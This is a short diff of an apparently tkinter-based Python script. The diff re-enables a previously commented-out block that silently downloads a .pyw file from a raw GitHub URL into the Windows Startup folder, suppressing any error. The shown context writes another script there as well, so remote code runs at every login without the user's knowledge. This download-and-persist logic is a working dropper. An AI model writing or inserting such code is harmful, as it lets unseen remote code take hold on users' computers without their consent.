@@ -6,15 +6,13 @@ from tkinter import messagebox
 #os.remove("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric.pyw")
 #%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 
-# Download new ric (TODO: temporarily uncomment this later)
-"""
+# Download new ric (TODO: comment out this later)
 ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"
 
 try:
     urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric_download.pyw", ricpath)
 except Exception:
     pass
-"""
 
 ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pastedl.pyw"
 
